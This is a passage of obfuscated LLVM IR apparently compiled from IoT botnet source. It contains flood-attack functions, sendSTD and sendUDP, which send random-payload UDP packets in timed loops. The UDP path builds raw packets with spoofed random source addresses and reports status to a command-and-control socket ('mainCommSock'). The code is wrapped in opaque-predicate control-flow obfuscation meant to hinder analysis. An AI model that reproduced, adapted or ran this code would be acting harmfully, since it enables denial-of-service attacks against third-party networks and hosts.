  %1750 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1749, i32 0, i32 6
  %1751 = load i32, i32* %1750, align 4
  %_117 = sub i32 0, %1751
  %gen118 = add i32 %_117, 20
  %_119 = sub i32 0, %1751
  %gen120 = add i32 %_119, 20
  %_121 = shl i32 %1751, 20
  %1752 = add i32 %1751, 20
  %1753 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1754 = icmp ult i32 %1752, %1753
  br label %originalBB116

originalBB125alteredBB:                           ; preds = %originalBB125, %1365
  %1755 = load i32, i32* %10, align 4
  %1756 = sext i32 %1755 to i64
  %1757 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1756
  %1758 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1757, i32 0, i32 0
  %1759 = load i32, i32* %1758, align 16
  %1760 = call i32 @sclose(i32 %1759)
  %1761 = load i32, i32* %10, align 4
  %1762 = sext i32 %1761 to i64
  %1763 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1762
  %1764 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1763, i32 0, i32 2
  store i8 0, i8* %1764, align 8
  %1765 = load i32, i32* %10, align 4
  %1766 = sext i32 %1765 to i64
  %1767 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1766
  %1768 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1767, i32 0, i32 3
  store i8 1, i8* %1768, align 1
  br label %originalBB125

originalBB129alteredBB:                           ; preds = %originalBB129, %1432
  %1769 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1770 = load i32, i32* %10, align 4
  %1771 = sext i32 %1770 to i64
  %1772 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1771
  %1773 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1772, i32 0, i32 6
  store i32 %1769, i32* %1773, align 4
  br label %originalBB129

originalBB133alteredBB:                           ; preds = %originalBB133, %1509
  br label %originalBB133

originalBB137alteredBB:                           ; preds = %originalBB137, %1531
  br label %originalBB137
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

declare i32 @time(...) #3

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8*, i32, i32) #0 {
  %4 = load i32, i32* @x.65
  %5 = load i32, i32* @y.66
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i64, align 8
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca %struct.hostent*, align 8
  %19 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i32 %1, i32* %13, align 4
  store i32 %2, i32* %14, align 4
  %20 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %20, i32* %15, align 4
  %21 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %22 = sext i32 %21 to i64
  store i64 %22, i64* %16, align 8
  %23 = load i8*, i8** %12, align 8
  %24 = call %struct.hostent* @gethostbyname(i8* %23)
  store %struct.hostent* %24, %struct.hostent** %18, align 8
  %25 = bitcast %struct.sockaddr_in* %17 to i8*
  call void @llvm.memset.p0i8.i64(i8* %25, i8 0, i64 16, i32 4, i1 false)
  %26 = load %struct.hostent*, %struct.hostent** %18, align 8
  %27 = getelementptr inbounds %struct.hostent, %struct.hostent* %26, i32 0, i32 4
  %28 = load i8**, i8*** %27, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 0
  %30 = load i8*, i8** %29, align 8
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %32 = bitcast %struct.in_addr* %31 to i8*
  %33 = load %struct.hostent*, %struct.hostent** %18, align 8
  %34 = getelementptr inbounds %struct.hostent, %struct.hostent* %33, i32 0, i32 3
  %35 = load i32, i32* %34, align 4
  %36 = sext i32 %35 to i64
  call void @bcopy(i8* %30, i8* %32, i64 %36) #2
  %37 = load %struct.hostent*, %struct.hostent** %18, align 8
  %38 = getelementptr inbounds %struct.hostent, %struct.hostent* %37, i32 0, i32 2
  %39 = load i32, i32* %38, align 8
  %40 = trunc i32 %39 to i16
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 %40, i16* %41, align 4
  %42 = load i32, i32* %13, align 4
  %43 = trunc i32 %42 to i16
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %43, i16* %44, align 2
  store i32 0, i32* %19, align 4
  %45 = load i32, i32* @x.65
  %46 = load i32, i32* @y.66
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %53

; <label>:53:                                     ; preds = %originalBBpart218, %originalBBpart2
  %54 = load i32, i32* %19, align 4
  %55 = icmp uge i32 %54, 50
  br i1 %55, label %56, label %89

; <label>:56:                                     ; preds = %53
  %57 = load i32, i32* @x.65
  %58 = load i32, i32* @y.66
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %56
  %65 = load i32, i32* %15, align 4
  %66 = call i64 @send(i32 %65, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.54, i32 0, i32 0), i64 50, i32 0)
  %67 = load i32, i32* %15, align 4
  %68 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %69 = call i32 @connect(i32 %67, %struct.sockaddr* %68, i32 16)
  %70 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %71 = sext i32 %70 to i64
  %72 = load i64, i64* %16, align 8
  %73 = load i32, i32* %14, align 4
  %74 = sext i32 %73 to i64
  %75 = add nsw i64 %72, %74
  %76 = icmp sge i64 %71, %75
  %77 = load i32, i32* @x.65
  %78 = load i32, i32* @y.66
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart27, label %originalBB1alteredBB

originalBBpart27:                                 ; preds = %originalBB1
  br i1 %76, label %85, label %88

; <label>:85:                                     ; preds = %originalBBpart27
  %86 = load i32, i32* %15, align 4
  %87 = call i32 @close(i32 %86)
  call void @_exit(i32 0) #12
  unreachable

; <label>:88:                                     ; preds = %originalBBpart27
  store i32 0, i32* %19, align 4
  br label %89

; <label>:89:                                     ; preds = %88, %53
  %90 = load i32, i32* @x.65
  %91 = load i32, i32* @y.66
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBB9, label %originalBB9alteredBB

originalBB9:                                      ; preds = %originalBB9alteredBB, %89
  %98 = load i32, i32* %19, align 4
  %99 = add i32 %98, 1
  store i32 %99, i32* %19, align 4
  %100 = load i32, i32* @x.65
  %101 = load i32, i32* @y.66
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBBpart218, label %originalBB9alteredBB

originalBBpart218:                                ; preds = %originalBB9
  br label %53
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %3
  %109 = alloca i8*, align 8
  %110 = alloca i32, align 4
  %111 = alloca i32, align 4
  %112 = alloca i32, align 4
  %113 = alloca i64, align 8
  %114 = alloca %struct.sockaddr_in, align 4
  %115 = alloca %struct.hostent*, align 8
  %116 = alloca i32, align 4
  store i8* %0, i8** %109, align 8
  store i32 %1, i32* %110, align 4
  store i32 %2, i32* %111, align 4
  %117 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %117, i32* %112, align 4
  %118 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %119 = sext i32 %118 to i64
  store i64 %119, i64* %113, align 8
  %120 = load i8*, i8** %109, align 8
  %121 = call %struct.hostent* @gethostbyname(i8* %120)
  store %struct.hostent* %121, %struct.hostent** %115, align 8
  %122 = bitcast %struct.sockaddr_in* %114 to i8*
  call void @llvm.memset.p0i8.i64(i8* %122, i8 0, i64 16, i32 4, i1 false)
  %123 = load %struct.hostent*, %struct.hostent** %115, align 8
  %124 = getelementptr inbounds %struct.hostent, %struct.hostent* %123, i32 0, i32 4
  %125 = load i8**, i8*** %124, align 8
  %126 = getelementptr inbounds i8*, i8** %125, i64 0
  %127 = load i8*, i8** %126, align 8
  %128 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %114, i32 0, i32 2
  %129 = bitcast %struct.in_addr* %128 to i8*
  %130 = load %struct.hostent*, %struct.hostent** %115, align 8
  %131 = getelementptr inbounds %struct.hostent, %struct.hostent* %130, i32 0, i32 3
  %132 = load i32, i32* %131, align 4
  %133 = sext i32 %132 to i64
  call void @bcopy(i8* %127, i8* %129, i64 %133) #2
  %134 = load %struct.hostent*, %struct.hostent** %115, align 8
  %135 = getelementptr inbounds %struct.hostent, %struct.hostent* %134, i32 0, i32 2
  %136 = load i32, i32* %135, align 8
  %137 = trunc i32 %136 to i16
  %138 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %114, i32 0, i32 0
  store i16 %137, i16* %138, align 4
  %139 = load i32, i32* %110, align 4
  %140 = trunc i32 %139 to i16
  %141 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %114, i32 0, i32 1
  store i16 %140, i16* %141, align 2
  store i32 0, i32* %116, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %56
  %142 = load i32, i32* %15, align 4
  %143 = call i64 @send(i32 %142, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.54, i32 0, i32 0), i64 50, i32 0)
  %144 = load i32, i32* %15, align 4
  %145 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %146 = call i32 @connect(i32 %144, %struct.sockaddr* %145, i32 16)
  %147 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %148 = sext i32 %147 to i64
  %149 = load i64, i64* %16, align 8
  %150 = load i32, i32* %14, align 4
  %151 = sext i32 %150 to i64
  %_ = sub i64 %149, %151
  %gen = mul i64 %_, %151
  %_2 = sub i64 %149, %151
  %gen3 = mul i64 %_2, %151
  %_4 = sub i64 %149, %151
  %gen5 = mul i64 %_4, %151
  %152 = add nsw i64 %149, %151
  %153 = icmp sge i64 %148, %152
  br label %originalBB1

originalBB9alteredBB:                             ; preds = %originalBB9, %89
  %154 = load i32, i32* %19, align 4
  %_10 = sub i32 0, %154
  %gen11 = add i32 %_10, 1
  %_12 = shl i32 %154, 1
  %_13 = sub i32 0, %154
  %gen14 = add i32 %_13, 1
  %_15 = sub i32 %154, 1
  %gen16 = mul i32 %_15, 1
  %155 = add i32 %154, 1
  store i32 %155, i32* %19, align 4
  br label %originalBB9
}

declare %struct.hostent* @gethostbyname(i8*) #3

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #4

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = load i32, i32* @x.67
  %8 = load i32, i32* @y.68
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.sockaddr_in, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i8*, align 8
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.udphdr*, align 8
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  store i8* %0, i8** %15, align 8
  store i32 %1, i32* %16, align 4
  store i32 %2, i32* %17, align 4
  store i32 %3, i32* %18, align 4
  store i32 %4, i32* %19, align 4
  store i32 %5, i32* %20, align 4
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 0
  store i16 2, i16* %36, align 4
  %37 = load i32, i32* %16, align 4
  %38 = icmp eq i32 %37, 0
  %39 = load i32, i32* @x.67
  %40 = load i32, i32* @y.68
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %38, label %47, label %67

; <label>:47:                                     ; preds = %originalBBpart2
  %48 = load i32, i32* @x.67
  %49 = load i32, i32* @y.68
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %47
  %56 = call i32 @rand_cmwc()
  %57 = trunc i32 %56 to i16
  %58 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 1
  store i16 %57, i16* %58, align 2
  %59 = load i32, i32* @x.67
  %60 = load i32, i32* @y.68
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %72

; <label>:67:                                     ; preds = %originalBBpart2
  %68 = load i32, i32* %16, align 4
  %69 = trunc i32 %68 to i16
  %70 = call zeroext i16 @htons(i16 zeroext %69) #13
  %71 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 1
  store i16 %70, i16* %71, align 2
  br label %72

; <label>:72:                                     ; preds = %67, %originalBBpart24
  %73 = load i8*, i8** %15, align 8
  %74 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 2
  %75 = call i32 @getHost(i8* %73, %struct.in_addr* %74)
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %77, label %94

; <label>:77:                                     ; preds = %72
  %78 = load i32, i32* @x.67
  %79 = load i32, i32* @y.68
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %77
  %86 = load i32, i32* @x.67
  %87 = load i32, i32* @y.68
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %477

; <label>:94:                                     ; preds = %72
  %95 = load i32, i32* @x.67
  %96 = load i32, i32* @y.68
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %94
  %103 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 3
  %104 = getelementptr inbounds [8 x i8], [8 x i8]* %103, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %104, i8 0, i64 8, i32 4, i1 false)
  %105 = load i32, i32* %20, align 4
  store i32 %105, i32* %22, align 4
  %106 = load i32, i32* %18, align 4
  %107 = icmp eq i32 %106, 32
  %108 = load i32, i32* @x.67
  %109 = load i32, i32* @y.68
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %107, label %116, label %232

; <label>:116:                                    ; preds = %originalBBpart212
  %117 = load i32, i32* @x.67
  %118 = load i32, i32* @y.68
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %116
  %125 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %125, i32* %23, align 4
  %126 = load i32, i32* %23, align 4
  %127 = icmp ne i32 %126, 0
  %128 = load i32, i32* @x.67
  %129 = load i32, i32* @y.68
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %127, label %139, label %136

; <label>:136:                                    ; preds = %originalBBpart216
  %137 = load i32, i32* @mainCommSock, align 4
  %138 = call i32 (i32, i8*, ...) @sockprintf(i32 %137, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.55, i32 0, i32 0))
  br label %477

; <label>:139:                                    ; preds = %originalBBpart216
  %140 = load i32, i32* %19, align 4
  %141 = add nsw i32 %140, 1
  %142 = sext i32 %141 to i64
  %143 = call noalias i8* @malloc(i64 %142) #2
  store i8* %143, i8** %24, align 8
  %144 = load i8*, i8** %24, align 8
  %145 = icmp eq i8* %144, null
  br i1 %145, label %146, label %163

; <label>:146:                                    ; preds = %139
  %147 = load i32, i32* @x.67
  %148 = load i32, i32* @y.68
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %146
  %155 = load i32, i32* @x.67
  %156 = load i32, i32* @y.68
  %157 = sub i32 %155, 1
  %158 = mul i32 %155, %157
  %159 = urem i32 %158, 2
  %160 = icmp eq i32 %159, 0
  %161 = icmp slt i32 %156, 10
  %162 = or i1 %160, %161
  br i1 %162, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %477

; <label>:163:                                    ; preds = %139
  %164 = load i8*, i8** %24, align 8
  %165 = load i32, i32* %19, align 4
  %166 = add nsw i32 %165, 1
  %167 = sext i32 %166 to i64
  call void @llvm.memset.p0i8.i64(i8* %164, i8 0, i64 %167, i32 1, i1 false)
  %168 = load i8*, i8** %24, align 8
  %169 = load i32, i32* %19, align 4
  call void @makeRandomStr(i8* %168, i32 %169)
  %170 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %171 = load i32, i32* %17, align 4
  %172 = add nsw i32 %170, %171
  store i32 %172, i32* %25, align 4
  store i32 0, i32* %26, align 4
  br label %173

; <label>:173:                                    ; preds = %212, %211, %163
  %174 = load i32, i32* %23, align 4
  %175 = load i8*, i8** %24, align 8
  %176 = load i32, i32* %19, align 4
  %177 = sext i32 %176 to i64
  %178 = bitcast %struct.sockaddr_in* %21 to %struct.sockaddr*
  %179 = call i64 @sendto(i32 %174, i8* %175, i64 %177, i32 0, %struct.sockaddr* %178, i32 16)
  %180 = load i32, i32* %26, align 4
  %181 = load i32, i32* %22, align 4
  %182 = icmp eq i32 %180, %181
  br i1 %182, label %183, label %212

; <label>:183:                                    ; preds = %173
  %184 = load i32, i32* @x.67
  %185 = load i32, i32* @y.68
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %183
  %192 = load i32, i32* %16, align 4
  %193 = icmp eq i32 %192, 0
  %194 = load i32, i32* @x.67
  %195 = load i32, i32* @y.68
  %196 = sub i32 %194, 1
  %197 = mul i32 %194, %196
  %198 = urem i32 %197, 2
  %199 = icmp eq i32 %198, 0
  %200 = icmp slt i32 %195, 10
  %201 = or i1 %199, %200
  br i1 %201, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %193, label %202, label %206

; <label>:202:                                    ; preds = %originalBBpart224
  %203 = call i32 @rand_cmwc()
  %204 = trunc i32 %203 to i16
  %205 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 1
  store i16 %204, i16* %205, align 2
  br label %206

; <label>:206:                                    ; preds = %202, %originalBBpart224
  %207 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %208 = load i32, i32* %25, align 4
  %209 = icmp sgt i32 %207, %208
  br i1 %209, label %210, label %211

; <label>:210:                                    ; preds = %206
  br label %215

; <label>:211:                                    ; preds = %206
  store i32 0, i32* %26, align 4
  br label %173

; <label>:212:                                    ; preds = %173
  %213 = load i32, i32* %26, align 4
  %214 = add i32 %213, 1
  store i32 %214, i32* %26, align 4
  br label %173

; <label>:215:                                    ; preds = %210
  %216 = load i32, i32* @x.67
  %217 = load i32, i32* @y.68
  %218 = sub i32 %216, 1
  %219 = mul i32 %216, %218
  %220 = urem i32 %219, 2
  %221 = icmp eq i32 %220, 0
  %222 = icmp slt i32 %217, 10
  %223 = or i1 %221, %222
  br i1 %223, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %215
  %224 = load i32, i32* @x.67
  %225 = load i32, i32* @y.68
  %226 = sub i32 %224, 1
  %227 = mul i32 %224, %226
  %228 = urem i32 %227, 2
  %229 = icmp eq i32 %228, 0
  %230 = icmp slt i32 %225, 10
  %231 = or i1 %229, %230
  br i1 %231, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %477

; <label>:232:                                    ; preds = %originalBBpart212
  %233 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %233, i32* %27, align 4
  %234 = load i32, i32* %27, align 4
  %235 = icmp ne i32 %234, 0
  br i1 %235, label %255, label %236

; <label>:236:                                    ; preds = %232
  %237 = load i32, i32* @x.67
  %238 = load i32, i32* @y.68
  %239 = sub i32 %237, 1
  %240 = mul i32 %237, %239
  %241 = urem i32 %240, 2
  %242 = icmp eq i32 %241, 0
  %243 = icmp slt i32 %238, 10
  %244 = or i1 %242, %243
  br i1 %244, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %236
  %245 = load i32, i32* @mainCommSock, align 4
  %246 = call i32 (i32, i8*, ...) @sockprintf(i32 %245, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.55, i32 0, i32 0))
  %247 = load i32, i32* @x.67
  %248 = load i32, i32* @y.68
  %249 = sub i32 %247, 1
  %250 = mul i32 %247, %249
  %251 = urem i32 %250, 2
  %252 = icmp eq i32 %251, 0
  %253 = icmp slt i32 %248, 10
  %254 = or i1 %252, %253
  br i1 %254, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %477

; <label>:255:                                    ; preds = %232
  store i32 1, i32* %28, align 4
  %256 = load i32, i32* %27, align 4
  %257 = bitcast i32* %28 to i8*
  %258 = call i32 @setsockopt(i32 %256, i32 0, i32 3, i8* %257, i32 4) #2
  %259 = icmp slt i32 %258, 0
  br i1 %259, label %260, label %263

; <label>:260:                                    ; preds = %255
  %261 = load i32, i32* @mainCommSock, align 4
  %262 = call i32 (i32, i8*, ...) @sockprintf(i32 %261, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.56, i32 0, i32 0))
  br label %477

; <label>:263:                                    ; preds = %255
  store i32 50, i32* %29, align 4
  br label %264

; <label>:264:                                    ; preds = %268, %263
  %265 = load i32, i32* %29, align 4
  %266 = add nsw i32 %265, -1
  store i32 %266, i32* %29, align 4
  %267 = icmp ne i32 %265, 0
  br i1 %267, label %268, label %273

; <label>:268:                                    ; preds = %264
  %269 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %270 = call i32 @rand_cmwc()
  %271 = xor i32 %269, %270
  call void @srand(i32 %271) #2
  %272 = call i32 @rand() #2
  call void @init_rand(i32 %272)
  br label %264

; <label>:273:                                    ; preds = %264
  %274 = load i32, i32* %18, align 4
  %275 = icmp eq i32 %274, 0
  br i1 %275, label %276, label %277

; <label>:276:                                    ; preds = %273
  store i32 0, i32* %30, align 4
  br label %283

; <label>:277:                                    ; preds = %273
  %278 = load i32, i32* %18, align 4
  %279 = sub nsw i32 32, %278
  %280 = shl i32 1, %279
  %281 = sub nsw i32 %280, 1
  %282 = xor i32 %281, -1
  store i32 %282, i32* %30, align 4
  br label %283

; <label>:283:                                    ; preds = %277, %276
  %284 = load i32, i32* %19, align 4
  %285 = sext i32 %284 to i64
  %286 = add i64 28, %285
  %287 = call i8* @llvm.stacksave()
  store i8* %287, i8** %31, align 8
  %288 = alloca i8, i64 %286, align 16
  %289 = bitcast i8* %288 to %struct.iphdr*
  store %struct.iphdr* %289, %struct.iphdr** %32, align 8
  %290 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %291 = bitcast %struct.iphdr* %290 to i8*
  %292 = getelementptr i8, i8* %291, i64 20
  %293 = bitcast i8* %292 to %struct.udphdr*
  store %struct.udphdr* %293, %struct.udphdr** %33, align 8
  %294 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %295 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 2
  %296 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %295, i32 0, i32 0
  %297 = load i32, i32* %296, align 4
  %298 = load i32, i32* %30, align 4
  %299 = call i32 @getRandomIP(i32 %298)
  %300 = call i32 @htonl(i32 %299) #13
  %301 = load i32, i32* %19, align 4
  %302 = sext i32 %301 to i64
  %303 = add i64 8, %302
  %304 = trunc i64 %303 to i32
  call void @makeIPPacket(%struct.iphdr* %294, i32 %297, i32 %300, i8 zeroext 17, i32 %304)
  %305 = load i32, i32* %19, align 4
  %306 = sext i32 %305 to i64
  %307 = add i64 8, %306
  %308 = trunc i64 %307 to i16
  %309 = call zeroext i16 @htons(i16 zeroext %308) #13
  %310 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %311 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %310, i32 0, i32 0
  %312 = bitcast %union.anon.2* %311 to %struct.anon.3*
  %313 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %312, i32 0, i32 2
  store i16 %309, i16* %313, align 2
  %314 = call i32 @rand_cmwc()
  %315 = trunc i32 %314 to i16
  %316 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %317 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %316, i32 0, i32 0
  %318 = bitcast %union.anon.2* %317 to %struct.anon.3*
  %319 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %318, i32 0, i32 0
  store i16 %315, i16* %319, align 2
  %320 = load i32, i32* %16, align 4
  %321 = icmp eq i32 %320, 0
  br i1 %321, label %322, label %324

; <label>:322:                                    ; preds = %283
  %323 = call i32 @rand_cmwc()
  br label %329

; <label>:324:                                    ; preds = %283
  %325 = load i32, i32* %16, align 4
  %326 = trunc i32 %325 to i16
  %327 = call zeroext i16 @htons(i16 zeroext %326) #13
  %328 = zext i16 %327 to i32
  br label %329

; <label>:329:                                    ; preds = %324, %322
